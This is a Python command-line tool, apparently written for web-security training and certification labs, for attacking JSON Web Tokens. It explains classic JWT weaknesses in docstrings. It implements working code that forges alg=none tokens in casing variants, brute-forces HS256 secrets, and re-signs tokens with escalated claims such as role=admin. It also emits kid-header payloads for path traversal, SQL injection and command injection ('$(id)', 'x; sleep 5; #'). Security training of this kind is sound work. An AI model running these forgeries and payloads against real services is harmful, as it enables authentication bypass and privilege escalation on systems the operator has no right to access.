#!/usr/bin/env python3
# Copyright (c) 2026 cyberprophetTV. Licensed under the MIT License (see LICENSE).
#
# FOR EDUCATIONAL USE ONLY.
# Use only against tokens you own or are authorized to test. See README.
"""
=====================================================================
jwt_tool.py - JSON Web Token analyzer + attack helpers
=====================================================================

WHAT'S A JWT?
-------------
A JSON Web Token is three base64url-encoded chunks joined with dots:

  HEADER  .  PAYLOAD  .  SIGNATURE
  -------    --------    -------------
  e.g.    eyJhbGciOiJIUzI1NiIs...  .  eyJzdWIiOiJhZG1pbiJ9  .  <hmac-or-sig>

  HEADER   = {"alg": "HS256", "typ": "JWT"}     - algorithm + token type
  PAYLOAD  = {"sub": "admin", "exp": 169...}    - the actual claims
  SIGNATURE = HMAC(HEADER + "." + PAYLOAD, SECRET)  using the alg in header

The server validates a token by:
  1. Looking at HEADER.alg
  2. Computing the signature itself using the appropriate algorithm
  3. Comparing to the supplied SIGNATURE
If they match, the token is "valid" and the server trusts the
PAYLOAD claims (often including a user id and role).

This means: if you can forge a valid signature, you forge a valid
token, and you become whoever the payload says you are.

CLASSIC JWT ATTACKS
-------------------
1. alg=none
   The JWT spec allows "alg": "none" - an unsigned token. Some
   libraries (and many home-rolled implementations) accept this:
   they see alg=none, skip signature verification entirely, and
   trust the payload. So:
       Original:  {"alg":"HS256"}.{"sub":"alice"}.<sig>
       Attack:    {"alg":"none"} .{"sub":"admin"}.<empty>
   Try it on every JWT you find. Servers that block it usually
   block "none" but allow "None" or "NONE" - try all three.

2. HS256 secret brute-force
   HS256 = HMAC-SHA256(signing_input, secret). If the server picked
   a weak secret ("secret", "key", "password", "your-256-bit-secret"
   from the docs), you can brute force it offline (no rate limit)
   by trying each candidate, computing what the signature would be,
   and comparing to the real one. Hit -> you know the secret ->
   you can sign arbitrary tokens.

3. kid (Key ID) injection
   The `kid` header tells the server "use the key file named X."
   Implementations have done:
       key = read_file("/keys/" + token.header.kid)
   without sanitizing. So `kid = "../../../dev/null"` reads /dev/null
   (empty file = empty key), then HMAC with empty key = predictable
   signature you can compute. Or `kid = "x' UNION SELECT 'mysecret--`
   if kid feeds a SQL lookup.

4. Algorithm confusion (RS256 -> HS256)
   If the server normally uses RS256 (asymmetric: signs with private,
   verifies with public) and the public key is exposed, an attacker
   can sign with HS256 using the PUBLIC key as the HMAC secret.
   Naive verification "trust whatever alg the header says" treats
   the public key as a symmetric secret and accepts the forgery.
   We can probe by issuing tokens with alg=HS256 and an HMAC of
   the candidate public key - this script doesn't attempt the
   full attack but flags tokens that use RS256 so you know to
   look for an exposed public key.

USE
---
Analyze a single token:
  python3 jwt_tool.py decode '<TOKEN>'

Generate an alg=none forgery:
  python3 jwt_tool.py none '<TOKEN>'

Brute-force HS256 with a wordlist:
  python3 jwt_tool.py brute '<TOKEN>' --wordlist common-jwt-secrets.txt

Re-sign with a known secret (after brute):
  python3 jwt_tool.py sign '<TOKEN>' --secret 's3cr3t' \\
      --set 'role=admin' --set 'sub=admin'

Probe kid injection (generate variants for you to try):
  python3 jwt_tool.py kid '<TOKEN>'

EXAMPLE INPUT (a textbook PortSwigger JWT lab token)
   eyJraWQiOiI...etc
Strip any "Bearer " prefix and pass just the token string.
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
from pathlib import Path

from _common import (
    tag_info, tag_ok, tag_warn, tag_err, tag_hit,
    progress, bold, dim, cyan, green, red, yellow,
)


# ---------------------------------------------------------------------
# BASE64URL ENCODE/DECODE
# ---------------------------------------------------------------------
# JWTs use base64url, which differs from standard base64 in two ways:
#   - `-` and `_` replace `+` and `/`
#   - no padding (`=`) characters
# Python's base64.urlsafe_b64{decode,encode} handles the substitution,
# but we need to manage padding ourselves.

def b64url_decode(s: str) -> bytes:
    """Base64url-decode a JWT segment. Pads `=` to a multiple of 4."""
    # Python's base64 module rejects unpadded input; add what's missing.
    pad_len = (-len(s)) % 4
    return base64.urlsafe_b64decode(s + "=" * pad_len)


def b64url_encode(data: bytes) -> str:
    """Base64url-encode bytes, stripping the trailing padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


# ---------------------------------------------------------------------
# PARSE
# ---------------------------------------------------------------------
def parse_token(token: str) -> tuple[dict, dict, bytes, str, str, str]:
    """
    Parse a JWT into its components.

    Returns (header_dict, payload_dict, signature_bytes,
             header_b64, payload_b64, sig_b64).

    We return both the parsed dicts AND the original b64 strings
    because re-signing requires the original encoded form (we sign
    over `header_b64 + "." + payload_b64`, and re-encoding the
    parsed dicts can produce subtly different bytes - e.g. key
    ordering or whitespace differences - that produce a different
    signature than the original.
    """
    parts = token.strip().split(".")
    if len(parts) != 3:
        sys.exit(f"{tag_err()} not a JWT - expected 3 dot-separated parts, "
                 f"got {len(parts)}")
    header_b64, payload_b64, sig_b64 = parts

    try:
        header_dict = json.loads(b64url_decode(header_b64))
        payload_dict = json.loads(b64url_decode(payload_b64))
    except (json.JSONDecodeError, ValueError) as e:
        sys.exit(f"{tag_err()} couldn't parse JWT contents: {e}")
    sig_bytes = b64url_decode(sig_b64) if sig_b64 else b""

    return header_dict, payload_dict, sig_bytes, header_b64, payload_b64, sig_b64


# ---------------------------------------------------------------------
# DECODE COMMAND
# ---------------------------------------------------------------------
def cmd_decode(token: str) -> int:
    """Print header + payload + signature info, plus security flags."""
    header, payload, sig_bytes, header_b64, payload_b64, sig_b64 = parse_token(token)

    print(f"{cyan('Header')}:")
    print(json.dumps(header, indent=2))
    print()
    print(f"{cyan('Payload')}:")
    print(json.dumps(payload, indent=2))
    print()
    print(f"{cyan('Signature')}: {sig_b64}  ({len(sig_bytes)} bytes)")
    print()

    # ---- Security flags ----
    print(cyan("Security observations:"))
    alg = header.get("alg", "")

    if alg.lower() == "none":
        print(f"  {tag_warn()} alg=none - this token is unsigned. The server "
              f"should reject it; if it doesn't, forgery is trivial.")
    elif alg.startswith("HS"):
        print(f"  {tag_info()} alg={alg} (HMAC, symmetric). Try brute-forcing "
              f"the secret with `{Path(__file__).name} brute`.")
    elif alg.startswith("RS") or alg.startswith("ES"):
        print(f"  {tag_info()} alg={alg} (asymmetric). If the server's public "
              f"key is exposed, look at algorithm-confusion attacks "
              f"(switch to HS256 using the public key as the HMAC secret).")

    if "kid" in header:
        kid_val = header['kid']
        print(f"  {tag_info()} kid={kid_val!r}. If the server uses kid as a "
              f"filename/SQL lookup without sanitization, try injection "
              f"(`{Path(__file__).name} kid`).")

    if "exp" not in payload:
        print(f"  {tag_warn()} no `exp` claim - token never expires.")
    if "iat" not in payload:
        print(f"  {tag_info()} no `iat` (issued-at) claim.")

    # Common role/admin claims to flag
    for claim in ("role", "roles", "admin", "isAdmin", "is_admin",
                  "permissions", "scope", "scopes", "groups"):
        if claim in payload:
            print(f"  {tag_info()} payload contains {claim}={payload[claim]!r} "
                  f"- target for tampering")
    return 0


# ---------------------------------------------------------------------
# ALG=NONE ATTACK
# ---------------------------------------------------------------------
def cmd_none(token: str, modify: dict[str, str]) -> int:
    """
    Generate every "alg=none"-style forgery variant worth trying.

    BSCP exam reality: if the server rejects `"alg":"none"` you can NOT
    give up - try these escalations in order:

      1. Casing variants - filters that lowercase-compare miss "None"
         and "NONE"; filters that case-insensitive-compare to "none"
         still miss creative mixings like "nOnE". We emit all five
         common shapes.

      2. `alg` key REMOVED entirely - some parsers default-to-none
         when the header lacks an `alg` key.

      3. Signature segment FULLY STRIPPED (no trailing dot) - some
         parsers accept `header.payload` without the third part.
         This is non-standard but real-world JWT libs have been
         caught accepting it.

      4. Empty-string signature with the trailing dot present
         (`header.payload.`) - the canonical alg=none format.

    --set key=value modifies the payload before re-encoding. Use to
    bump `sub` to admin, set `role: admin`, etc.
    """
    header, payload, _, _, _, _ = parse_token(token)

    # Apply payload modifications once (shared across all variants).
    new_payload = dict(payload)
    for k, v in modify.items():
        # Try to preserve the original type of the claim if possible.
        new_payload[k] = _coerce_value(v, payload.get(k))
    # Compact JSON - matches what JWT libraries emit by default.
    p_b64 = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())

    def _emit(label: str, header_dict: dict, sig_suffix: str) -> None:
        h_b64 = b64url_encode(json.dumps(header_dict, separators=(",", ":")).encode())
        forged = f"{h_b64}.{p_b64}{sig_suffix}"
        print(f"  {tag_ok()} {label}:  {forged}")

    # ---- Tier 1: alg casing variants with trailing-dot empty sig ----
    print(f"{tag_info()} alg-value casings (most servers filter only \"none\"):")
    for alg_variant in ("none", "None", "NONE", "nOnE", "NoNe"):
        new_header = {**header, "alg": alg_variant}
        _emit(f"alg={alg_variant!r:>9}", new_header, ".")

    # ---- Tier 2: alg key removed entirely ----
    # Some libraries (older PyJWT, custom impls) default to "none"
    # when the header has no alg key at all.
    print()
    print(f"{tag_info()} alg key REMOVED (default-to-none parsers):")
    header_no_alg = {k: v for k, v in header.items() if k != "alg"}
    _emit("(alg key absent)", header_no_alg, ".")

    # ---- Tier 3: signature fully stripped (no trailing dot) ----
    # Non-standard but in the wild - some parsers split on '.' and
    # only check parts[0..1], never validating parts[2] exists.
    print()
    print(f"{tag_info()} signature segment STRIPPED (no trailing dot):")
    header_with_none = {**header, "alg": "none"}
    _emit("(stripped, alg=none)", header_with_none, "")
    _emit("(stripped, alg removed)", header_no_alg, "")
    return 0


def _coerce_value(raw: str, original_value):
    """
    Try to make `raw` match the type of `original_value`. So if the
    original `exp` was an int, we parse our string value as an int.
    Falls back to string if conversion fails.
    """
    if isinstance(original_value, bool):
        return raw.lower() in ("true", "1", "yes")
    if isinstance(original_value, int):
        try: return int(raw)
        except ValueError: return raw
    if isinstance(original_value, float):
        try: return float(raw)
        except ValueError: return raw
    return raw


# ---------------------------------------------------------------------
# HS256 BRUTE FORCE
# ---------------------------------------------------------------------
def hs256_sign(signing_input: bytes, secret: bytes) -> bytes:
    """HMAC-SHA256 the signing input with the secret. The JWT signature for HS256."""
    return hmac.new(secret, signing_input, hashlib.sha256).digest()


def cmd_brute(token: str, wordlist_path: Path) -> int:
    """
    Try each candidate secret. For each, compute what the signature
    would be and compare to the token's actual signature using a
    constant-time compare (hmac.compare_digest).

    The brute force is OFFLINE - no requests sent to the server.
    Speed is bounded only by SHA256 throughput on your CPU
    (millions/sec on modern hardware).
    """
    header, _payload, sig_bytes, header_b64, payload_b64, _sig_b64 = parse_token(token)
    alg = header.get("alg", "")
    if alg != "HS256":
        sys.exit(f"{tag_err()} brute force only implemented for HS256; "
                 f"token alg is {alg!r}")

    signing_input = f"{header_b64}.{payload_b64}".encode()

    words = [w for w in (l.strip() for l in wordlist_path.read_text().splitlines()) if w]
    print(f"{tag_info()} trying {len(words)} candidate secrets")

    for secret in progress(words, total=len(words), desc="brute", unit="key"):
        candidate = hs256_sign(signing_input, secret.encode())
        # hmac.compare_digest avoids timing side-channels (not strictly
        # needed offline but cheap defensive habit).
        if hmac.compare_digest(candidate, sig_bytes):
            print(f"{tag_ok()} secret found: {bold(secret)}")
            return 0

    print(f"{tag_err()} no secret in the wordlist signs this token.")
    return 1


# ---------------------------------------------------------------------
# RE-SIGN COMMAND (after you know the secret)
# ---------------------------------------------------------------------
def cmd_sign(token: str, secret: str, modify: dict[str, str]) -> int:
    """
    Re-sign a JWT with a known HS256 secret, optionally modifying claims.

    Use this AFTER `brute` finds the secret to actually forge a useful
    token: set role=admin, sub=admin, etc.
    """
    header, payload, _, _, _, _ = parse_token(token)
    if not header.get("alg", "").startswith("HS"):
        sys.exit(f"{tag_err()} sign command only implemented for HS* "
                 f"algorithms; got {header.get('alg')!r}")

    new_payload = dict(payload)
    for k, v in modify.items():
        new_payload[k] = _coerce_value(v, payload.get(k))

    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hs256_sign(signing_input, secret.encode())
    sig_b64 = b64url_encode(sig)

    forged = f"{h_b64}.{p_b64}.{sig_b64}"
    print(f"{tag_ok()} signed token:")
    print(forged)
    return 0


# ---------------------------------------------------------------------
# KID INJECTION PROBES
# ---------------------------------------------------------------------
# Curated list of kid-injection payloads. Each targets a specific
# class of broken kid handling.
KID_PAYLOADS = [
    # Path traversal to a known-empty file (so HMAC with empty key
    # becomes predictable - YOU then re-sign with empty key).
    ("../../../dev/null",        "path traversal to empty file"),
    ("/dev/null",                "absolute path to empty file"),
    ("../../../../../../tmp/x",  "deeper traversal"),

    # SQL injection if kid feeds a database query.
    ("' OR '1'='1",                       "basic SQLi"),
    ("x' UNION SELECT 'AAAA'--",          "SQLi UNION pulling known value"),

    # Command injection if kid is shelled out (rare but seen).
    ("x; sleep 5; #",                     "command injection (time-based)"),
    ("$(id)",                              "command substitution"),

    # Null-byte truncation (some older libs).
    ("../../../etc/passwd\x00.jwk",       "null-byte truncation"),
]


def cmd_kid(token: str) -> int:
    """
    Generate token variants with poisoned `kid` headers.

    The signature stays the same (still based on the ORIGINAL signing
    input). This is fine for the "kid -> empty file -> empty HMAC key"
    attack because the attack only works if the SERVER recomputes the
    signature using your forged kid. We're handing you a corpus to
    try; how the server reacts tells you which (if any) is exploitable.
    """
    header, payload, sig_bytes, _, _, sig_b64 = parse_token(token)
    print(f"{tag_info()} original kid: {header.get('kid', '<absent>')!r}")
    print(f"{tag_info()} generated {len(KID_PAYLOADS)} kid-injection variants:")
    print()

    for kid_val, description in KID_PAYLOADS:
        new_header = dict(header)
        new_header["kid"] = kid_val
        h_b64 = b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        # Keep the original payload + signature - we just swap the header.
        # (Signature won't match for most servers; we're testing
        # whether they're vulnerable in a way that ignores the failed
        # signature check.)
        _, _, _, _, p_b64, s_b64 = parse_token(token)
        variant = f"{h_b64}.{p_b64}.{s_b64}"
        print(f"  {bold(description)}:")
        print(f"    kid: {kid_val!r}")
        print(f"    token: {variant}")
        print()
    return 0


# ---------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------
def parse_set(raw: str) -> tuple[str, str]:
    """Parse a --set key=value pair."""
    if "=" not in raw:
        sys.exit(f"{tag_err()} --set must look like key=value, got {raw!r}")
    k, _, v = raw.partition("=")
    return k.strip(), v.strip()


def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = ap.add_subparsers(dest="cmd", required=True)

    ap_decode = sub.add_parser("decode", help="Decode and analyze a JWT")
    ap_decode.add_argument("token")

    ap_none = sub.add_parser("none",
                             help="Generate an alg=none forgery (and 'None'/'NONE' variants)")
    ap_none.add_argument("token")
    ap_none.add_argument("--set", action="append", default=[], metavar="K=V",
                         help="Modify a payload claim before forging (repeatable). "
                              "e.g. --set sub=admin --set role=admin")

    ap_brute = sub.add_parser("brute", help="Brute-force the HS256 secret")
    ap_brute.add_argument("token")
    ap_brute.add_argument("--wordlist", type=Path, default=Path("common-jwt-secrets.txt"),
                          help="Secrets wordlist (default common-jwt-secrets.txt)")

    ap_sign = sub.add_parser("sign", help="Re-sign with a known HS256 secret")
    ap_sign.add_argument("token")
    ap_sign.add_argument("--secret", required=True)
    ap_sign.add_argument("--set", action="append", default=[], metavar="K=V",
                         help="Modify a payload claim (repeatable)")

    ap_kid = sub.add_parser("kid", help="Generate kid-header injection variants")
    ap_kid.add_argument("token")

    args = ap.parse_args()

    if args.cmd == "decode":
        return cmd_decode(args.token)
    if args.cmd == "none":
        modify = dict(parse_set(s) for s in args.set)
        return cmd_none(args.token, modify)
    if args.cmd == "brute":
        return cmd_brute(args.token, args.wordlist)
    if args.cmd == "sign":
        modify = dict(parse_set(s) for s in args.set)
        return cmd_sign(args.token, args.secret, modify)
    if args.cmd == "kid":
        return cmd_kid(args.token)


if __name__ == "__main__":
    sys.exit(main())
